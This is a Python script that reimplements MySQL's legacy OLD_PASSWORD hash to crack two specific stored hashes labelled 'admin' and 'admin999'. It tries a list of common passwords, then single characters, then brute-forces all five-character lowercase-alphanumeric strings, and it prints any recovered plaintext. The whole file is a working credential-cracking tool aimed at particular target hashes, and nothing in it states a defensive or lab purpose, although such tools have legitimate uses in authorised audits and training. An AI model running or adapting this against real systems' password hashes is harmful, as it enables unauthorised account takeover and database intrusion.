import itertools
import string
import sys

def mysql_old_password(password):
    nr = 1345345333
    add = 7
    nr2 = 0x12345671
    for c in password:
        if c == ' ' or c == '\t':
            continue
        byte = ord(c)
        nr ^= (((nr & 63) + add) * byte) + (nr << 8)
        nr2 += (nr2 << 8) ^ nr
        add += byte
    nr = nr & 0x7fffffff
    nr2 = nr2 & 0x7fffffff
    return '%08lx%08lx' % (nr, nr2)

targets = {'2d9d5942943a1323': 'admin', '79dca16741891333': 'admin999'}
found = {}

# First try common passwords
common = [
    'root', '12345', '123456', '1234567', '12345678', '123456789', 'password',
    'admin123', 'admin1234', 'admin12345', 'passwd', 'pass123', 'p@ssw0rd',
    'toor', 'mysql', 'mysql123', 'dbadmin', 'root123', 'root1234',
    'test', 'test123', 'guest', 'user', 'user123', '1234', '1234567890',
    'abc123', '123qwe', 'qwe123', '1q2w3e', 'pass', 'pass1234',
    'admin2024', 'admin2025', 'admin2026', 'server', 'server123',
    'data123', 'database', 'db123', 'manager', 'manager123',
    'web', 'web123', 'www', 'www123', 'backup', 'backup123',
    'P@ssw0rd', 'Password1', 'Admin123', 'Root123',
    '123456a', 'a123456', '123abc', 'abc1234', 'password123',
    'root123456', 'admin@123', 'admin!123', 'admin_123',
    'zaq1xsw2', 'zaq12wsx', '1qaz2wsx', 'qazwsx', '123qweasd',
    'passw0rd', 'p@1504w0rd', 'letmein', 'welcome', 'monkey',
    'dragon', 'master', 'access', 'hello123', '654321',
    '000000', '111111', '112233', '121212', '147258',
    '888888', '999999', '666666', '555555', '777777',
    'admin1', 'admin2', 'admin3', 'root1', 'root2',
]
for pw in common:
    h = mysql_old_password(pw)
    if h in targets:
        found[h] = pw
        print('FOUND common: ' + targets[h] + ' -> ' + pw, flush=True)

# Try single chars a-z, 0-9
for c in string.ascii_lowercase + string.digits:
    h = mysql_old_password(c)
    if h in targets:
        found[h] = c
        print('FOUND single: ' + targets[h] + ' -> ' + c, flush=True)

charset = string.ascii_lowercase + string.digits
print('Charset length: ' + str(len(charset)), flush=True)

if len(found) < len(targets):
    # Try length 5 (36^5 = 60M - might be slow, try in chunks)
    print('Trying length 5 alphanumeric...', flush=True)
    count = 0
    for combo in itertools.product(charset, repeat=5):
        pw = ''.join(combo)
        h = mysql_old_password(pw)
        if h in targets:
            found[h] = pw
            print('FOUND length5: ' + targets[h] + ' -> ' + pw, flush=True)
            if len(found) == len(targets):
                break
        count += 1
        if count % 5000000 == 0:
            print('  checked ' + str(count) + '...', flush=True)

print()
print('=== RESULTS ===')
for h, username in targets.items():
    if h in found:
        print(username + ' (' + h + '): ' + found[h])
    else:
        print(username + ' (' + h + '): NOT FOUND')
